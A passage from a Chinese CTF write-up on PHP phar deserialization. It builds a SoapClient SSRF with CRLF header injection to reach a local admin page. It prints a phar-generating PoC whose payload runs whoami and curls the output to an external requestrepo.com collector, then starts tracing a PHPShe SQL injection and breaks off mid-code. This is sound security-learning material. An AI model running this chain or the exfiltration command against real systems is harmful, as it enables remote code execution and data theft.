+</span></span><span class=line><span class=cl>        <span class=nv>$func2</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;func2&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$func3</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;func3&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$arg1</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;arg1&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$arg2</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;arg2&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$arg2</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;arg3&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$admin</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Ad</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>,</span> <span class=nv>$clazz</span><span class=p>,</span> <span class=nv>$func1</span><span class=p>,</span> <span class=nv>$func2</span><span class=p>,</span> <span class=nv>$func3</span><span class=p>,</span> <span class=nv>$arg1</span><span class=p>,</span> <span class=nv>$arg2</span><span class=p>,</span> <span class=nv>$arg3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$admin</span><span class=o>-&gt;</span><span class=na>check</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;You r not admin!&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>需要本地才能拿访问，可以用SoapClient来进行ssrf攻击，就可以任意执行命令了。</p><p>先利用wakeup反射出SoapClient，file_name为CRLF的参数，会触发Ad的check()，如果没能通过的话，创建对象也就失败，也就不会销毁了。所以现在需要找一个类，能够通过check</p><p>仔细看check函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>check</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflect</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span> <span class=o>=</span> <span class=nv>$reflect</span><span class=o>-&gt;</span><span class=na>newInstanceArgs</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里进行了反射类调用，然后再调用他的三个方法，并且传入的是不同参数，相当于这样的代码，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$instance</span><span class=o>-&gt;</span><span class=p>{</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func1</span><span class=p>}(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$instance</span><span class=o>-&gt;</span><span class=p>{</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func2</span><span class=p>}(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg2</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl><span class=nv>$instance</span><span class=o>-&gt;</span><span class=p>{</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func3</span><span class=p>}(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg3</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>满足这样条件的原生类其实不少，这里我使用<code>SplQueue</code>，写出poc，不过buu现在环境有问题了，无法出网，所以我利用本地测试的，Windows里面不识别反引号</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;for /f &#34;delims=&#34; %i in (\&#39;whoami\&#39;) do curl &#34;https://sh3pc7ox.requestrepo.com/?flag=%i&#34;&#39;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>这样子没问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>File</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file_name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func</span><span class=o>=</span><span class=s2>&#34;SoapClient&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$payload</span><span class=o>=</span><span class=s1>&#39;admin=1&amp;cmd=for /f &#34;delims=&#34; %i in (\&#39;whoami\&#39;) do curl &#34;https://sh3pc7ox.requestrepo.com/?flag=%i&#34;&amp;clazz=SplQueue&amp;func1=enqueue&amp;func2=enqueue&amp;func3=enqueue&amp;arg1=test1&amp;arg2=test2&amp;arg3=test3&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_name</span><span class=o>=</span><span class=p>[</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;http://127.0.0.2/admin.php&#39;</span><span class=p>,</span><span class=s1>&#39;user_agent&#39;</span><span class=o>=&gt;</span><span class=s2>&#34;xxx</span><span class=se>\r\n</span><span class=s2>Content-Type: application/x-www-form-urlencoded</span><span class=se>\r\n</span><span class=s2>Content-Length: &#34;</span><span class=o>.</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$payload</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=nv>$payload</span><span class=p>,</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;test&#39;</span><span class=p>)];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>File</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.jpg&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>=</span><span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s1>&#39;GIF89a&#39;</span><span class=o>.</span><span class=s1>&#39;&lt;script language=&#34;php&#34;&gt;__HALT_COMPILER();&lt;/script&gt;&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>rename</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>,</span> <span class=s2>&#34;phar.jpg&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>php</span><span class=p>:</span><span class=o>//</span><span class=n>filter</span><span class=o>/</span><span class=n>resource</span><span class=o>=</span><span class=n>phar</span><span class=p>:</span><span class=o>//</span><span class=n>upload</span><span class=o>/</span><span class=n>f528764d624db129b32c21fbca0cb8d6</span><span class=o>/</span><span class=mf>628941e623</span><span class=n>f5a967093007bf39be805f</span><span class=o>.</span><span class=n>jpg</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/phar-deserialization-analysis/QQ20250728-222802.jpg width=1107 height=840 loading=lazy alt=1></p><h2 id=demo4>demo4</h2><p><strong>[RoarCTF 2019]PHPShe</strong></p><p>看robots.txt发现版本以及一些路由</p><p><img src=/p/phar-deserialization-analysis/QQ20250729-104354.jpg width=955 height=583 loading=lazy alt=1></p><p><a class=link href=https://www.seebug.org/vuldb/ssvid-62341 target=_blank rel=noopener>https://www.seebug.org/vuldb/ssvid-62341</a> 我找到一个这个，但是发现关键文件这里面根本没有</p><p><a class=link href=https://anquan.baidu.com/article/697 target=_blank rel=noopener>https://anquan.baidu.com/article/697</a> 但是这个是可以用的，在<code>include/plugin/payment/alipay/pay.php</code>里面有查询代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nv>$order_id</span> <span class=o>=</span> <span class=nx>pe_dbhold</span><span class=p>(</span><span class=nv>$_g_id</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$order_id</span> <span class=o>=</span> <span class=nx>intval</span><span class=p>(</span><span class=nv>$order_id</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$order</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>pe_select</span><span class=p>(</span><span class=nx>order_table</span><span class=p>(</span><span class=nv>$order_id</span><span class=p>),</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;order_id&#39;</span><span class=o>=&gt;</span><span class=nv>$order_id</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们追寻<code>$_g_id</code>，在文件头部找到include文件里面有<code>common.php</code>，里面有一个参数覆盖的条件语句</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>get_magic_quotes_gpc</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>extract</span><span class=p>(</span><span class=nx>pe_trim</span><span class=p>(</span><span class=nx>pe_stripslashes</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>)),</span> <span class=nx>EXTR_PREFIX_ALL</span><span class=p>,</span> <span class=s1>&#39;_g&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>extract</span><span class=p>(</span><span class=nx>pe_trim</span><span class=p>(</span><span class=nx>pe_stripslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>)),</span> <span class=nx>EXTR_PREFIX_ALL</span><span class=p>,</span> <span class=s1>&#39;_p&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>extract</span><span class=p>(</span><span class=nx>pe_trim</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>),</span><span class=nx>EXTR_PREFIX_ALL</span><span class=p>,</span><span class=s1>&#39;_g&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>extract</span><span class=p>(</span><span class=nx>pe_trim</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>),</span><span class=nx>EXTR_PREFIX_ALL</span><span class=p>,</span><span class=s1>&#39;_p&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>get_magic_quotes_gpc</code>会自动对$REQUEST里面的参数添加<code>\</code>，<code>pe_stripslashes($_GET)</code> 移除添加的<code>\</code>，<code>EXTR_PREFIX_ALL</code>会自动给参数加前缀，所以<code>$_g_id</code>就是从这里来的，接着看函数处理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>pe_dbhold</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span> <span class=nv>$exc</span><span class=o>=</span><span class=k>array</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$str</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>foreach</span><span class=p>(</span><span class=nv>$str</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$str</span><span class=p>[</span><span class=nv>$k</span><span class=p>]</span> <span class=o>=</span> <span class=nx>in_array</span><span class=p>(</span><span class=nv>$k</span><span class=p>,</span> <span class=nv>$exc</span><span class=p>)</span> <span class=o>?</span> <span class=nx>pe_dbhold</span><span class=p>(</span><span class=nv>$v</span><span class=p>,</span> <span class=s1>&#39;all&#39;</span><span class=p>)</span> <span class=o>:</span> <span class=nx>pe_dbhold</span><span class=p>(</span><span class=nv>$v</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=c1>//$str = $exc == &#39;all&#39; ? mysql_real_escape_string($str) : mysql_real_escape_string(htmlspecialchars($str));
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nv>$str</span> <span class=o>=</span> <span class=nv>$exc</span> <span class=o>==</span> <span class=s1>&#39;all&#39;</span> <span class=o>?</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$str</span><span class=p>)</span> <span class=o>:</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$str</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nv>$str</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>由于我们传入的并非数组，<code>$exc</code>默认值和all作比较为False，不过对于注入语句，都不影响，都只是一个<code>addslashes</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>order_table</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$id</span><span class=p>,</span> <span class=s1>&#39;_&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$id_arr</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;_&#39;</span><span class=p>,</span> <span class=nv>$id</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s2>&#34;order_</span><span class=si>{</span><span class=nv>$id_arr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s2>&#34;order&#34;</span><span class=p>;</span>	
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里主要是影响有下划线的表名，如果有会根据下划线截取分割成数组</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>pe_select</span><span class=p>(</span><span class=nv>$table</span><span class=p>,</span> <span class=nv>$where</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$field</span> <span class=o>=</span> <span class=s1>&#39;*&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=c1>//处理条件语句
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nv>$sqlwhere</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>_dowhere</span><span class=p>(</span><span class=nv>$where</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>sql_select</span><span class=p>(</span><span class=s2>&#34;select </span><span class=si>{</span><span class=nv>$field</span><span class=si>}</span><span class=s2> from `&#34;</span><span class=o>.</span><span class=nx>dbpre</span><span class=o>.</span><span class=s2>&#34;</span><span class=si>{</span><span class=nv>$table</span><span class=si>}</span><span class=s2>` </span><span class=si>{</span><span class=nv>$sqlwhere</span><span class=si>}</span><span class=s2> limit 1&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>里面有个可疑函数<code>_dowhere</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>	<span class=k>protected</span> <span class=k>function</span> <span class=nf>_dowhere</span><span class=p>(</span><span class=nv>$where</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$where</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=k>foreach</span> <span class=p>(</span><span class=nv>$where</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>				<span class=nv>$k</span> <span class=o>=</span> <span class=nx>str_ireplace</span><span class=p>(</span><span class=s1>&#39;`&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$k</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>				<span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$v</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>					<span class=nv>$where_arr</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;`</span><span class=si>{</span><span class=nv>$k</span><span class=si>}</span><span class=s2>` in(&#39;&#34;</span><span class=o>.</span><span class=nx>implode</span><span class=p>(</span><span class=s2>&#34;&#39;,&#39;&#34;</span><span class=p>,</span> <span class=nv>$v</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;&#39;)&#34;</span><span class=p>;</span>			
+</span></span><span class=line><span class=cl>				<span class=p>}</span>
+</span></span><span class=line><span class=cl>				<span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>					<span class=nx>in_array</span><span class=p>(</span><span class=nv>$k</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;order by&#39;</span><span class=p>,</span> <span class=s1>&#39;group by&#39;</span><span class=p>))</span> <span class=o>?</span> <span class=p>(</span><span class=nv>$sqlby</span> <span class=o>.=</span> <span class=s2>&#34; </span><span class=si>{</span><span class=nv>$k</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=nv>$v</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>:</span> <span class=p>(</span><span class=nv>$where_arr</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;`</span><span class=si>{</span><span class=nv>$k</span><span class=si>}</span><span class=s2>` = &#39;</span><span class=si>{</span><span class=nv>$v</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>				<span class=p>}</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$sqlwhere</span> <span class=o>=</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$where_arr</span><span class=p>)</span> <span class=o>?</span> <span class=s1>&#39;where &#39;</span><span class=o>.</span><span class=nx>implode</span><span class=p>(</span><span class=nv>$where_arr</span><span class=p>,</span> <span class=s1>&#39; and &#39;</span><span class=p>)</span><span class=o>.</span><span class=nv>$sqlby</span> <span class=o>:</span> <span class=nv>$sqlby</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$where</span> <span class=o>&amp;&amp;</span> <span class=nv>$sqlwhere</span> <span class=o>=</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nx>trim</span><span class=p>(</span><span class=nv>$where</span><span class=p>),</span> <span class=s1>&#39;order by&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span> <span class=k>or</span> <span class=nx>stripos</span><span class=p>(</span><span class=nx>trim</span><span class=p>(</span><span class=nv>$where</span><span class=p>),</span> <span class=s1>&#39;group by&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=o>?</span> <span class=s2>&#34;</span><span class=si>{</span><span class=nv>$where</span><span class=si>}</span><span class=s2>&#34;</span> <span class=o>:</span> <span class=s2>&#34;where 1 </span><span class=si>{</span><span class=nv>$where</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
